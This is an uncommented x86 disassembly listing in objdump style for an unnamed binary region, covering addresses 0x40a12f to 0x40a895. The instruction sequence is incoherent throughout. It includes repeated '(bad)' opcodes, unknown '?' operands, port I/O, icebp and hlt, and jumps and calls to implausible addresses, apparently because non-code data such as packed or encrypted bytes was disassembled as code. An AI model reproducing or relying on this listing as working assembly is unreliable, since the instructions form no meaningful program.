  40a12f:	in     al,dx
  40a130:	loopne 0x40a130
  40a132:	data16 fst DWORD PTR [edx-0x2964f418]
  40a139:	lahf   
  40a13a:	adc    cl,bl
  40a13c:	jbe    0x40a113
  40a13e:	xchg   ebx,eax
  40a13f:	out    dx,al
  40a140:	jmp    0x40a1be
  40a142:	inc    ebp
  40a143:	outs   dx,DWORD PTR ds:[esi]
  40a144:	pop    ebx
  40a145:	loopne 0x40a1c5
  40a147:	cld    
  40a148:	sub    al,0xb6
  40a14a:	push   eax
  40a14b:	aam    0x9e
  40a14d:	jne    0x40a0f7
  40a14f:	push   ss
  40a150:	jecxz  0x40a100
  40a152:	(bad)  
  40a153:	jbe    0x40a17a
  40a155:	and    DWORD PTR [eax+0x62],esi
  40a158:	adc    BYTE PTR [edi+eax*8],bh
  40a15b:	and    bh,dh
  40a15d:	adc    DWORD PTR [ebx],eax
  40a15f:	arpl   WORD PTR [ecx-0x352c3e9],di
  40a165:	dec    ecx
  40a166:	ss cwde 
  40a168:	mov    bx,WORD PTR [edx]
  40a16b:	xor    al,0xe5
  40a16d:	pop    edi
  40a16e:	sub    al,0xa4
  40a170:	(bad)  
  40a171:	xchg   esi,eax
  40a172:	add    DWORD PTR [eax-0x8],ebp
  40a175:	mov    ds:0x5dbc5a1c,eax
  40a17a:	fdiv   st,st(7)
  40a17c:	inc    esp
  40a17d:	fisttp WORD PTR [ecx+0x62]
  40a180:	loop   0x40a1ac
  40a182:	add    ebp,ecx
  40a184:	mov    ebx,0x9f740ba4
  40a189:	dec    ebx
  40a18a:	into   
  40a18b:	into   
  40a18c:	inc    ecx
  40a18d:	out    0x7e,al
  40a18f:	mov    DWORD PTR [ecx+eiz*2-0x197ce376],ecx
  40a196:	lahf   
  40a197:	xchg   DWORD PTR [ecx-0x46],eax
  40a19a:	jae    0x40a15f
  40a19c:	mov    ch,0x5a
  40a19e:	jl     0x40a204
  40a1a0:	retf   0x273e
  40a1a3:	mov    cl,0xab
  40a1a5:	adc    ah,BYTE PTR [edx+0x22343eba]
  40a1ab:	xchg   ebp,eax
  40a1ac:	xor    esi,DWORD PTR [edi]
  40a1ae:	push   0x14
  40a1b0:	pop    eax
  40a1b1:	fld    QWORD PTR [ebx+0x4a]
  40a1b4:	jecxz  0x40a154
  40a1b6:	push   cs
  40a1b7:	jae    0x40a1d6
  40a1b9:	add    edi,DWORD PTR [eax+edx*4]
  40a1bc:	loope  0x40a1d0
  40a1be:	pop    ss
  40a1bf:	xor    eax,0xd4786dc3
  40a1c4:	mov    ds:0xe7c44817,al
  40a1c9:	int3   
  40a1ca:	or     edx,DWORD PTR ds:0x9d7fecde
  40a1d0:	pop    ebp
  40a1d1:	and    eax,DWORD PTR [edi+0x65dee1b2]
  40a1d7:	test   DWORD PTR [eax+0x0],ebp
  40a1da:	mov    ecx,esp
  40a1dc:	test   DWORD PTR [ecx+0x0],edi
  40a1df:	test   DWORD PTR [ebx-0x9cb5e4c],0xd183dd
  40a1e9:	jb     0x40a1d7
  40a1eb:	add    DWORD PTR ds:0xc1e84346,esi
  40a1f1:	push   0x48
  40a1f3:	mov    eax,0xa3ff6129
  40a1f8:	rol    BYTE PTR [edi-0x6a062289],0x28
  40a1ff:	push   esi
  40a200:	(bad)  
  40a201:	hlt    
  40a202:	inc    eax
  40a203:	xlat   BYTE PTR ds:[ebx]
  40a204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a205:	mov    al,ds:0x424b144e
  40a20a:	jle    0x40a25e
  40a20c:	sahf   
  40a20d:	mov    ecx,0x25a0e952
  40a212:	stc    
  40a213:	push   0x2c8ba21d
  40a218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a219:	xor    dl,BYTE PTR [edi]
  40a21b:	jns    0x40a1dd
  40a21d:	je     0x40a1dd
  40a21f:	jne    0x40a257
  40a221:	mov    ch,bh
  40a223:	loop   0x40a1ec
  40a225:	inc    edx
  40a226:	shl    BYTE PTR [ebp+0x62],1
  40a229:	mov    ?,WORD PTR [ebx-0x60]
  40a22c:	test   edi,ecx
  40a22e:	xchg   DWORD PTR [ebp+0x20461c3b],edi
  40a234:	sbb    al,0x4
  40a236:	lods   eax,DWORD PTR ds:[esi]
  40a237:	or     edx,DWORD PTR [eiz*2+0x3e882a49]
  40a23e:	arpl   WORD PTR [ebx+0x149e17e8],dx
  40a244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a245:	icebp  
  40a246:	jae    0x40a23e
  40a248:	add    eax,0xe23023e7
  40a24d:	sbb    edi,eax
  40a24f:	or     BYTE PTR [eax-0x7f],ah
  40a252:	jge    0x40a217
  40a254:	scas   eax,DWORD PTR es:[edi]
  40a255:	sbb    al,0x16
  40a257:	mov    cl,0x5d
  40a259:	xor    eax,0xbcae98c8
  40a25e:	aaa    
  40a25f:	cs mov ebx,0xafdd2935
  40a265:	mov    bh,0x56
  40a267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a269:	mov    dh,0xab
  40a26b:	retf   0x8613
  40a26e:	aas    
  40a26f:	or     DWORD PTR [ebp-0x6c5bfae6],0xda939b39
  40a279:	xchg   edi,eax
  40a27a:	or     ebp,DWORD PTR [esi]
  40a27c:	pop    edx
  40a27d:	ins    BYTE PTR es:[edi],dx
  40a27e:	push   esi
  40a27f:	out    dx,eax
  40a280:	rcl    DWORD PTR [ebp+ebp*4-0x57],cl
  40a284:	gs dec esi
  40a286:	bound  edx,QWORD PTR [eax+0x77]
  40a289:	inc    ebp
  40a28a:	imul   esp,esi,0xf837a3f
  40a290:	sbb    al,0xd0
  40a292:	adc    ch,cl
  40a294:	push   esp
  40a295:	jecxz  0x40a2cc
  40a297:	addr16 jg 0x40a2d5
  40a29a:	popf   
  40a29b:	sub    BYTE PTR [ebx+0x61763eba],ch
  40a2a1:	push   DWORD PTR [ebp-0x54]
  40a2a4:	outs   dx,BYTE PTR ds:[esi]
  40a2a5:	ffree  st(1)
  40a2a7:	dec    edi
  40a2a8:	sbb    eax,DWORD PTR [edi+eiz*1-0x47]
  40a2ac:	jns    0x40a304
  40a2ae:	out    0xd5,eax
  40a2b0:	loopne 0x40a308
  40a2b2:	retf   0x7acf
  40a2b5:	cmp    al,0x5f
  40a2b7:	sub    dh,BYTE PTR [eax]
  40a2b9:	cmp    BYTE PTR [ebx+0x58],dl
  40a2bc:	mov    eax,ds:0x5686d4cb
  40a2c1:	xor    ebp,esi
  40a2c3:	inc    eax
  40a2c4:	rcr    cl,0x36
  40a2c7:	outs   dx,BYTE PTR ds:[esi]
  40a2c8:	nop
  40a2c9:	mov    cl,0x4e
  40a2cb:	mov    dh,0xbe
  40a2cd:	sbb    al,0x87
  40a2cf:	daa    
  40a2d0:	int    0x33
  40a2d2:	ins    BYTE PTR es:[edi],dx
  40a2d3:	push   ebp
  40a2d4:	push   ss
  40a2d5:	xchg   edx,eax
  40a2d6:	call   0xed2c852
  40a2db:	or     eax,esp
  40a2dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2de:	dec    esi
  40a2df:	mov    ebp,0x92c29773
  40a2e4:	push   0xdd88c762
  40a2e9:	out    0x19,al
  40a2eb:	mov    eax,0xfda985c8
  40a2f0:	shl    dl,1
  40a2f2:	pop    ebx
  40a2f3:	cmp    BYTE PTR [edi-0x1d1c0945],cl
  40a2f9:	xlat   BYTE PTR ds:[ebx]
  40a2fa:	pop    ebx
  40a2fb:	ss test cl,al
  40a2fe:	inc    ebp
  40a2ff:	in     eax,dx
  40a300:	fwait
  40a301:	cwde   
  40a302:	xchg   edi,esi
  40a304:	jb     0x40a2d4
  40a306:	lds    ebp,FWORD PTR [ecx-0x10]
  40a309:	aaa    
  40a30a:	pop    esp
  40a30b:	mov    ah,BYTE PTR ds:0x247f9e43
  40a311:	pop    ds
  40a312:	push   esi
  40a313:	imul   eax,DWORD PTR [eax-0x52],0x4a
  40a317:	enter  0x7cb1,0xd7
  40a31b:	in     eax,dx
  40a31c:	adc    al,0x90
  40a31e:	cmp    DWORD PTR ds:0xd92d075e,ecx
  40a324:	(bad)  
  40a326:	cmp    ecx,DWORD PTR [ebp-0x4d192d41]
  40a32c:	xchg   ebx,eax
  40a32d:	psubsb mm5,QWORD PTR [ecx-0x15]
  40a331:	xor    al,0x44
  40a333:	addr16 adc eax,0x6e6ed342
  40a339:	add    eax,0x673fe1b9
  40a33e:	xor    BYTE PTR [esi],al
  40a340:	cmp    al,0x4f
  40a342:	push   eax
  40a343:	fs push ebx
  40a345:	test   DWORD PTR ds:0x30e32c95,ebx
  40a34b:	push   edx
  40a34c:	pop    edx
  40a34d:	std    
  40a34e:	popa   
  40a34f:	mov    ch,BYTE PTR [ebx+0x5]
  40a352:	shl    BYTE PTR [edi-0x1d],1
  40a355:	cmp    eax,0xedbb721f
  40a35a:	and    ebp,DWORD PTR [ebx+0x42]
  40a35d:	or     BYTE PTR [eax],0x4d
  40a360:	adc    al,0x90
  40a362:	mov    ds:0xb5267e64,al
  40a367:	push   esi
  40a368:	cli    
  40a369:	xor    DWORD PTR [ecx+ebx*2-0x424f08a5],0xd
  40a371:	dec    eax
  40a372:	inc    edi
  40a373:	sbb    eax,0xb48f5aa0
  40a378:	sbb    dh,BYTE PTR [ecx]
  40a37a:	jge    0x40a3bb
  40a37c:	inc    ebp
  40a37d:	repnz out dx,al
  40a37f:	mov    ebx,0x41e2ea6
  40a384:	inc    ebx
  40a385:	ret    
  40a386:	inc    esi
  40a387:	adc    dh,BYTE PTR [ebx]
  40a389:	test   DWORD PTR [ecx+0x53b1436a],0x25eb7827
  40a393:	bound  esp,QWORD PTR ds:0xc5d3e571
  40a399:	in     al,0x7a
  40a39b:	jae    0x40a3ac
  40a39d:	jmp    0xefe7:0xd04f438f
  40a3a4:	adc    bh,BYTE PTR [esi+edx*2]
  40a3a7:	int    0xe6
  40a3a9:	mov    edx,0x1dc010de
  40a3ae:	fcom   DWORD PTR [ebx+0x166e37fe]
  40a3b4:	les    ebx,FWORD PTR [edx]
  40a3b6:	icebp  
  40a3b7:	gs mov dl,0x2b
  40a3ba:	adc    esp,DWORD PTR [ebp+0x67]
  40a3bd:	sti    
  40a3be:	in     al,0x7a
  40a3c0:	xchg   ecx,eax
  40a3c1:	cwde   
  40a3c2:	fdivr  DWORD PTR [ecx+ecx*2+0x53]
  40a3c6:	cmp    eax,0xf4025da6
  40a3cb:	mov    fs,WORD PTR [eax+0x3a]
  40a3ce:	add    ecx,edx
  40a3d0:	loope  0x40a427
  40a3d2:	cmp    ebx,ecx
  40a3d4:	loop   0x40a359
  40a3d6:	cmp    BYTE PTR [edi-0x6cf1c68],al
  40a3dc:	pop    DWORD PTR [esi+0x472e3acc]
  40a3e2:	sbb    bh,ah
  40a3e4:	push   esi
  40a3e5:	pop    ebp
  40a3e6:	adc    al,0x0
  40a3e8:	jae    0x40a407
  40a3ea:	stos   BYTE PTR es:[edi],al
  40a3eb:	fcomi  st,st(2)
  40a3ed:	sbb    al,0x80
  40a3ef:	jae    0x40a379
  40a3f1:	adc    DWORD PTR [edx],0xffffffb9
  40a3f4:	xchg   ecx,eax
  40a3f5:	xlat   BYTE PTR ds:[ebx]
  40a3f6:	xor    dl,BYTE PTR [esi-0x21]
  40a3f9:	cli    
  40a3fa:	test   DWORD PTR [eax],ebp
  40a3fc:	jb     0x40a3e0
  40a3fe:	pop    edx
  40a3ff:	fdivrp st(1),st
  40a401:	icebp  
  40a402:	enter  0x22f7,0xe6
  40a406:	les    ebx,FWORD PTR [ebx]
  40a408:	daa    
  40a409:	bound  esi,QWORD PTR [edi+0x29]
  40a40c:	hlt    
  40a40d:	mov    al,ds:0x3be80ef4
  40a412:	shl    DWORD PTR [eax],0x89
  40a415:	test   DWORD PTR [ebx],edi
  40a417:	push   esi
  40a418:	ficomp DWORD PTR [ebp+0x3addc045]
  40a41e:	mov    edi,0xd19a7dbc
  40a423:	loop   0x40a3a8
  40a425:	inc    esp
  40a426:	or     ebx,ebx
  40a428:	sbb    eax,0x4f69cc31
  40a42d:	jne    0x40a452
  40a42f:	test   al,0x9a
  40a431:	xchg   BYTE PTR [eax+edx*4+0x34],dl
  40a435:	sbb    eax,0x99decabb
  40a43a:	pop    es
  40a43b:	push   cs
  40a43c:	dec    edx
  40a43d:	hlt    
  40a43e:	int3   
  40a43f:	lods   al,BYTE PTR ds:[esi]
  40a440:	mov    ?,WORD PTR [edx+0x4bcbb16c]
  40a446:	inc    esi
  40a447:	xchg   ebp,eax
  40a448:	and    eax,0xb9219719
  40a44d:	scas   al,BYTE PTR es:[edi]
  40a44e:	das    
  40a44f:	cmp    bh,BYTE PTR [edi+0x67]
  40a452:	or     DWORD PTR [edi-0x3aed1ef2],ebp
  40a458:	aaa    
  40a459:	push   ebx
  40a45a:	mov    dh,BYTE PTR [ebx+0x60ae7ca5]
  40a460:	mov    ds:0x8621c4ca,al
  40a465:	(bad)  
  40a466:	out    0x82,eax
  40a468:	push   ds
  40a469:	stos   BYTE PTR es:[edi],al
  40a46a:	mov    ch,0x8
  40a46c:	add    al,0x21
  40a46e:	outs   dx,DWORD PTR ds:[esi]
  40a46f:	shr    ch,cl
  40a471:	popf   
  40a472:	es mov ch,0x5b
  40a475:	retf   0xb51a
  40a478:	fs xchg esp,eax
  40a47a:	mov    bl,0xe0
  40a47c:	mov    ecx,0x72dc02c6
  40a481:	inc    ecx
  40a482:	out    0xfb,eax
  40a484:	cmp    al,0x61
  40a486:	sub    DWORD PTR [edx],ebp
  40a488:	addr16 or ecx,0x6a
  40a48c:	fwait
  40a48d:	and    dl,BYTE PTR [eax-0x6b9b4b9a]
  40a493:	mov    ebp,0xabfa3e22
  40a498:	xor    BYTE PTR [ebp+0xf],cl
  40a49b:	pop    ebp
  40a49c:	xchg   BYTE PTR [ecx],bl
  40a49e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a49f:	sahf   
  40a4a0:	fisubr DWORD PTR [eax]
  40a4a2:	ins    DWORD PTR es:[edi],dx
  40a4a3:	add    DWORD PTR [eiz*8-0x7776e94f],esi
  40a4aa:	push   edx
  40a4ab:	adc    edx,DWORD PTR [eax+0x4cebf6c1]
  40a4b1:	inc    edx
  40a4b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4b3:	jnp    0x40a475
  40a4b5:	cmp    DWORD PTR [ecx+ebp*2-0xa],ebp
  40a4b9:	jnp    0x40a530
  40a4bb:	mov    ah,0xe8
  40a4bd:	scas   al,BYTE PTR es:[edi]
  40a4be:	adc    DWORD PTR [edi+ebp*1],esp
  40a4c1:	retf   
  40a4c2:	pusha  
  40a4c3:	mov    WORD PTR [eax-0x53c6c5f5],gs
  40a4c9:	jp     0x40a4d6
  40a4cb:	pop    ds
  40a4cc:	outs   dx,DWORD PTR ds:[esi]
  40a4cd:	pop    ebx
  40a4ce:	mov    WORD PTR [ecx],cs
  40a4d0:	push   0x63226763
  40a4d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4d6:	lea    edx,[edx]
  40a4d8:	icebp  
  40a4d9:	add    edi,eax
  40a4db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4dc:	fbld   TBYTE PTR [ecx-0x46]
  40a4df:	in     al,0x8e
  40a4e1:	mov    ch,0x1f
  40a4e3:	not    esp
  40a4e5:	jb     0x40a485
  40a4e7:	outs   dx,DWORD PTR ds:[esi]
  40a4e8:	push   es
  40a4e9:	mov    eax,0x5a816da8
  40a4ee:	lahf   
  40a4ef:	jmp    0x40a50a
  40a4f1:	mov    ds:0x89dbcf2c,eax
  40a4f6:	mov    DWORD PTR [ecx+ecx*1+0x70f1a3cd],ebp
  40a4fd:	inc    ebx
  40a4fe:	aad    0xc6
  40a500:	mov    cs,WORD PTR [ebx-0x20009cb6]
  40a506:	sahf   
  40a507:	mov    cl,0xda
  40a509:	inc    edi
  40a50a:	mov    edi,gs
  40a50c:	imul   ebp,DWORD PTR [eax+0x4e49e03a],0x230c4a27
  40a516:	mov    WORD PTR [edx],?
  40a518:	test   al,0xbe
  40a51a:	(bad)  
  40a51b:	cmc    
  40a51c:	sti    
  40a51d:	gs sti 
  40a51f:	inc    ebx
  40a520:	lea    esi,[esi+ecx*2]
  40a523:	fisub  DWORD PTR [ebx]
  40a525:	inc    ebx
  40a526:	sub    eax,0xa3accafd
  40a52b:	aam    0xfa
  40a52d:	fst    st(6)
  40a52f:	js     0x40a513
  40a531:	push   esi
  40a532:	les    eax,FWORD PTR [ebp+0xe]
  40a535:	loop   0x40a506
  40a537:	jl     0x40a509
  40a539:	jle    0x40a5aa
  40a53b:	test   eax,0x7100b623
  40a540:	or     BYTE PTR [ecx-0x4aa530e7],0x96
  40a547:	out    0x61,eax
  40a549:	(bad)  
  40a54b:	mov    esi,DWORD PTR [edx]
  40a54d:	cld    
  40a54e:	aad    0xbe
  40a550:	add    esi,edi
  40a552:	push   cs
  40a553:	sbb    ebx,ebx
  40a555:	and    BYTE PTR [edi],0xcd
  40a558:	xor    al,0xcc
  40a55a:	rol    DWORD PTR [ebp+0xd],0xa0
  40a55e:	stos   BYTE PTR es:[edi],al
  40a55f:	loop   0x40a5ce
  40a561:	loope  0x40a5be
  40a563:	mov    dh,ah
  40a565:	jo     0x40a576
  40a567:	dec    eax
  40a568:	push   0x790045d4
  40a56d:	add    eax,0x786c6459
  40a572:	mov    ds:0xc4fb7d8c,al
  40a577:	jg     0x40a54b
  40a579:	or     al,0x23
  40a57b:	shl    DWORD PTR [ecx-0x38b1d193],cl
  40a581:	inc    ebp
  40a582:	inc    esi
  40a583:	mov    edi,0xcf593a35
  40a588:	adc    ebp,DWORD PTR [ebx-0x4e]
  40a58b:	jg     0x40a602
  40a58d:	push   cs
  40a58e:	mov    edx,0xe8469b5b
  40a593:	mov    DWORD PTR [ebp+0x141dfb57],ecx
  40a599:	loop   0x40a539
  40a59b:	jbe    0x40a61c
  40a59d:	adc    eax,0xe28dd839
  40a5a2:	fisubr DWORD PTR [ebp+0x63]
  40a5a5:	icebp  
  40a5a6:	push   ebx
  40a5a7:	imul   ebp,DWORD PTR [esi+0xae0e2f0],0x3f
  40a5ae:	fisubr DWORD PTR [esi+0x5be6afea]
  40a5b4:	jecxz  0x40a611
  40a5b6:	mov    eax,ds:0x2e6b23f3
  40a5bb:	sbb    eax,0x7de2b3de
  40a5c0:	gs inc esp
  40a5c2:	inc    edi
  40a5c3:	pop    edi
  40a5c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5c5:	ret    0xaa04
  40a5c8:	retf   0xff1f
  40a5cb:	xchg   ebx,eax
  40a5cc:	mov    ecx,0x72fc1647
  40a5d1:	inc    ebx
  40a5d2:	mov    bl,0x7c
  40a5d4:	call   0x3ac87e27
  40a5d9:	fs sub eax,ebx
  40a5dc:	es jmp 0x40a5b5
  40a5df:	xchg   edx,eax
  40a5e0:	aad    0xc8
  40a5e2:	mov    cl,0x2a
  40a5e4:	mov    bl,0x5e
  40a5e6:	shr    BYTE PTR [ebx-0x32],cl
  40a5e9:	adc    al,0xfe
  40a5eb:	fsubr  DWORD PTR gs:[ecx]
  40a5ee:	mov    ds:0xf418fc26,al
  40a5f3:	stos   BYTE PTR es:[edi],al
  40a5f4:	push   ebp
  40a5f5:	into   
  40a5f6:	mov    cl,0xef
  40a5f8:	call   0xdff4aa8c
  40a5fd:	xchg   BYTE PTR [edx],bl
  40a5ff:	xor    dl,dh
  40a601:	les    ebx,FWORD PTR [esp+eiz*4-0x16c1fac8]
  40a608:	mov    eax,0x6bd82b64
  40a60d:	dec    ebp
  40a60e:	mov    edi,DWORD PTR [esi+0x27]
  40a611:	icebp  
  40a612:	inc    esp
  40a613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a614:	mov    esp,0xb303e153
  40a619:	rcl    DWORD PTR [ebx],0x2a
  40a61c:	fst    DWORD PTR [ebx]
  40a61e:	or     ch,BYTE PTR [eax]
  40a620:	inc    esi
  40a621:	push   eax
  40a622:	add    ebp,DWORD PTR [ebp-0x2e]
  40a625:	fidivr DWORD PTR [edx+0x24]
  40a628:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a629:	mov    dh,0xd8
  40a62b:	inc    edi
  40a62c:	mov    bh,0x84
  40a62e:	xor    eax,0x5820702b
  40a633:	cmp    bl,ah
  40a635:	mov    ds:0xf7aaa1f8,eax
  40a63a:	and    DWORD PTR [esi],edx
  40a63c:	int3   
  40a63d:	jno    0x40a5d5
  40a63f:	xchg   edi,eax
  40a640:	lahf   
  40a641:	sub    DWORD PTR [eax-0x91129db],esp
  40a647:	sti    
  40a648:	call   0x37fa:0x6987bca7
  40a64f:	in     al,dx
  40a650:	mov    bh,0xce
  40a652:	push   ebp
  40a653:	popf   
  40a654:	jns    0x40a691
  40a656:	out    dx,al
  40a657:	push   esi
  40a658:	xchg   esp,eax
  40a659:	imul   ebx,DWORD PTR [esi],0x63e83f25
  40a65f:	fisttp WORD PTR [esi+0x37]
  40a662:	inc    edx
  40a663:	daa    
  40a664:	sbb    DWORD PTR [edi+0x39ae78b5],edi
  40a66a:	dec    esp
  40a66b:	mov    ebx,0x10cb612e
  40a670:	pusha  
  40a671:	mov    eax,0xeca203b4
  40a676:	ret    0xd8d9
  40a679:	clc    
  40a67a:	aam    0xd8
  40a67c:	cmp    ebp,DWORD PTR [ebp*2+0x274c32d1]
  40a683:	int    0x49
  40a685:	dec    esp
  40a686:	pop    edi
  40a687:	ficom  WORD PTR [ebp+0x7ce8d3da]
  40a68d:	push   0x72
  40a68f:	test   BYTE PTR [ebp-0x54],0xc1
  40a693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a694:	jo     0x40a640
  40a696:	pop    edi
  40a697:	pop    eax
  40a698:	cs inc ebx
  40a69a:	shl    BYTE PTR [eax+0x39],cl
  40a69d:	ss nop
  40a69f:	dec    esi
  40a6a0:	lods   eax,DWORD PTR ds:[esi]
  40a6a1:	in     eax,0x7f
  40a6a3:	xor    eax,0xf2cfbc5b
  40a6a8:	add    edi,ebp
  40a6aa:	jns    0x40a6aa
  40a6ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6ad:	cmovl  edi,edi
  40a6b0:	dec    ebp
  40a6b1:	in     eax,dx
  40a6b2:	jne    0x40a69c
  40a6b4:	pop    ebp
  40a6b5:	shl    BYTE PTR [edx],1
  40a6b7:	std    
  40a6b8:	cld    
  40a6b9:	jg     0x40a69e
  40a6bb:	sti    
  40a6bc:	in     al,dx
  40a6bd:	jmp    0x2f9e942f
  40a6c2:	sbb    BYTE PTR [eax],dh
  40a6c4:	arpl   WORD PTR [ecx-0x505576a8],bp
  40a6ca:	(bad)  [bx+si+0x4678]
  40a6cf:	addr16 in al,dx
  40a6d1:	(bad)  
  40a6d3:	xchg   DWORD PTR [edx+0x1f0e142b],ebp
  40a6d9:	or     bl,BYTE PTR [eax]
  40a6db:	mov    ebx,0x609c7d6a
  40a6e0:	in     al,dx
  40a6e1:	rcl    DWORD PTR [ebx],0xfb
  40a6e4:	mov    BYTE PTR ds:0x53d72e38,cl
  40a6ea:	sub    ch,bl
  40a6ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6ed:	pushf  
  40a6ee:	mov    esi,ebp
  40a6f0:	push   ds
  40a6f1:	clc    
  40a6f2:	or     DWORD PTR [esi],0x13
  40a6f5:	hlt    
  40a6f6:	into   
  40a6f7:	fwait
  40a6f8:	sub    bh,dl
  40a6fa:	pop    esp
  40a6fb:	push   ebx
  40a6fc:	rol    BYTE PTR [edi+0x1c],0xbd
  40a700:	ss inc esi
  40a702:	lods   al,BYTE PTR ds:[esi]
  40a703:	dec    esi
  40a704:	adc    eax,0xa10ce563
  40a709:	cdq    
  40a70a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a70b:	pop    eax
  40a70c:	pop    ds
  40a70d:	push   es
  40a70e:	mov    ebp,0xdce4a1c7
  40a713:	in     al,0x71
  40a715:	call   0x5c008008
  40a71a:	sbb    DWORD PTR ds:[esi-0x31a2cfe8],edi
  40a721:	adc    esp,edi
  40a723:	pop    ebx
  40a724:	push   ebp
  40a725:	fdivrp st(3),st
  40a727:	iret   
  40a728:	cs or  ch,0x67
  40a72c:	ror    DWORD PTR [eax-0x32],cl
  40a72f:	push   ebx
  40a730:	inc    edi
  40a731:	shl    BYTE PTR [ecx],cl
  40a733:	in     eax,0x74
  40a735:	div    edi
  40a737:	add    BYTE PTR [esi],dh
  40a739:	fs popf 
  40a73b:	push   edx
  40a73c:	gs xchg edi,eax
  40a73e:	ds xchg ebp,eax
  40a740:	adc    ebx,DWORD PTR [eax-0x17]
  40a743:	xchg   DWORD PTR [edx+0x5d],ebp
  40a746:	fisub  DWORD PTR ds:0xf35da3de
  40a74c:	mov    al,ds:0x891d5bf6
  40a751:	xchg   BYTE PTR [ebx],ah
  40a753:	fld    QWORD PTR es:[eax-0x49]
  40a757:	mov    dl,0xdb
  40a759:	xchg   edx,eax
  40a75a:	adc    eax,0xc509fcc8
  40a760:	inc    esi
  40a761:	std    
  40a762:	jecxz  0x40a762
  40a764:	sbb    DWORD PTR ds:0xd6a3,0xfffffff3
  40a76a:	jge    0x40a6ff
  40a76c:	push   0x220a6f72
  40a771:	add    eax,0x4e3668cf
  40a776:	push   0xffffffad
  40a778:	push   ebx
  40a779:	push   eax
  40a77a:	sbb    al,BYTE PTR ds:0x75fd4366
  40a780:	xor    al,0xc2
  40a782:	sbb    cl,dl
  40a784:	push   si
  40a786:	pop    ss
  40a787:	fistp  QWORD PTR [ebx]
  40a789:	sub    BYTE PTR [ecx],bh
  40a78b:	add    bh,cl
  40a78d:	xor    eax,0x9214bc4e
  40a792:	fsubr  DWORD PTR [eax-0x795e93a0]
  40a798:	dec    ebp
  40a799:	test   DWORD PTR [ebx],ebp
  40a79b:	sub    dh,BYTE PTR [edi+0x32]
  40a79e:	fidivr DWORD PTR [ecx+0x566fb17a]
  40a7a4:	in     eax,dx
  40a7a5:	push   0x48c29891
  40a7aa:	in     al,0xee
  40a7ac:	jo     0x40a780
  40a7ae:	int    0x2e
  40a7b0:	and    DWORD PTR [ebx-0x1a],eax
  40a7b3:	retf   0xc3d5
  40a7b6:	or     al,0x16
  40a7b8:	mov    edi,0xac851d4d
  40a7bd:	div    BYTE PTR [ebx-0x58b0fdbc]
  40a7c3:	push   es
  40a7c4:	add    ch,BYTE PTR [eax+0x7ceb9b7b]
  40a7ca:	adc    DWORD PTR [esp+ebp*8],ebp
  40a7cd:	mov    dh,0xe2
  40a7cf:	xchg   edi,eax
  40a7d0:	fadd   QWORD PTR [ecx-0x5fd8b04e]
  40a7d6:	pop    ss
  40a7d7:	popf   
  40a7d8:	sbb    BYTE PTR [edi],dl
  40a7da:	mov    edx,0xc6e3df2e
  40a7df:	inc    ecx
  40a7e0:	shr    bl,1
  40a7e2:	or     esp,DWORD PTR [ebx+0x52]
  40a7e5:	in     eax,dx
  40a7e6:	mov    al,ds:0x7dc3e644
  40a7eb:	scas   eax,DWORD PTR es:[edi]
  40a7ec:	jno    0x40a818
  40a7ee:	xlat   BYTE PTR ds:[ebx]
  40a7ef:	cwde   
  40a7f0:	sbb    BYTE PTR [edi+edi*1+0x448a4b16],bh
  40a7f7:	jae    0x40a82c
  40a7f9:	push   0xd4d7afd2
  40a7fe:	push   eax
  40a7ff:	out    dx,eax
  40a800:	cmp    eax,0xdf298ff5
  40a805:	jmp    0x45177a89
  40a80a:	pop    eax
  40a80b:	cld    
  40a80c:	fwait
  40a80d:	xor    al,0xca
  40a80f:	push   ebx
  40a810:	dec    esp
  40a811:	xor    eax,0x81b7bbf6
  40a816:	pop    esp
  40a817:	add    ecx,DWORD PTR [ebp+0x5d9554d2]
  40a81d:	sub    eax,0x2caec5a4
  40a822:	xor    DWORD PTR [edx+ebx*2],0xdafdd6bb
  40a829:	sbb    eax,0xfbcf20c
  40a82e:	scas   al,BYTE PTR es:[edi]
  40a82f:	and    BYTE PTR [eax],ch
  40a831:	shr    edx,1
  40a833:	mov    ah,0x1d
  40a835:	jmp    0x40a87c
  40a837:	sbb    DWORD PTR [edx],eax
  40a839:	push   esp
  40a83a:	je     0x40a7d0
  40a83c:	sub    DWORD PTR [edx+0x572e596f],eax
  40a842:	popa   
  40a843:	jge    0x40a829
  40a845:	cld    
  40a846:	pop    eax
  40a847:	xchg   ebp,eax
  40a848:	xlat   BYTE PTR ds:[ebx]
  40a849:	mov    edi,DWORD PTR [edi+0x41]
  40a84c:	inc    ecx
  40a84d:	shl    ah,0x4d
  40a850:	push   esp
  40a851:	inc    ebp
  40a852:	mov    edx,0xd1688527
  40a857:	retf   
  40a858:	adc    eax,0xb3d2bb9b
  40a85d:	loope  0x40a8ab
  40a85f:	mov    WORD PTR [ebx],gs
  40a861:	mov    DWORD PTR [esi+0x1ec95b47],0x9c0b22dc
  40a86b:	imul   ebp,ecx,0xffffff88
  40a86e:	dec    eax
  40a86f:	or     eax,0x5760f1a
  40a874:	mov    dl,0x61
  40a876:	mov    esp,DWORD PTR [edx-0x11]
  40a879:	rol    BYTE PTR [ebp+ebx*2-0x51d2dbaa],1
  40a880:	stos   DWORD PTR es:[edi],eax
  40a881:	fdiv   QWORD PTR [esi+0x2]
  40a884:	fidivr WORD PTR [eax]
  40a886:	xchg   edi,eax
  40a887:	shl    DWORD PTR [ebp-0x11cb83a9],0xe5
  40a88e:	or     ah,BYTE PTR [eax+0x7]
  40a891:	bound  edi,QWORD PTR [esi+0x4]
  40a894:	inc    ecx
  40a895:	jmp    DWORD PTR [edi-0x627c5f78]
